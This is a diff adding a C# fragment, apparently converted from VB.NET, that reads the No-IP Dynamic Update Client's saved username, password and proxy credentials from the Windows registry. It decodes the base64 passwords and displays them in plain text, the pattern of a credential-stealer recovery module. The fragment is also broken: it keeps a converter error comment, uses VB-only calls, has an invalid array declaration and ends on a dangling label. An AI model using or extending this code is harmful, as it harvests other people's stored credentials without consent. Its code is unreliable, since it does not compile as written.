@@ -1,0 +1,30 @@
+	public string base64Decode(string data)
+	{
+		try {
+			System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
+			System.Text.Decoder utf8Decode = encoder.GetDecoder();
+			byte[] todecode_byte = Convert.FromBase64String(data);
+			int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);
+			char[] decoded_char = new char[charCount - 1] {
+				
+			};
+			utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
+			string result = new String(decoded_char);
+			return result;
+		} catch (Exception e) {
+			throw new Exception("Error in base64Decode" + e.Message);
+		}
+	}
+	void NoIPRec()
+	{
+		 // ERROR: Not supported in C#: OnErrorStatement
+
+		string Username = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", null);
+		string Password = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", null);
+		string ProxyUsername = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", null);
+		string ProxyPassword = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", null);
+		string ProxyPort = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", null);
+		string NL = vbNewLine;
+		TextBox1.Text = TextBox1.Text + "-No IP-" + NL + "Username: " + Username + NL + "Password: " + base64Decode(Password) + NL + "Proxy Username:" + ProxyUsername + NL + "Proxy Password: " + base64Decode(ProxyPassword) + NL + "Proxy Port: " + ProxyPort + NL + NL;
+		X:
+	}
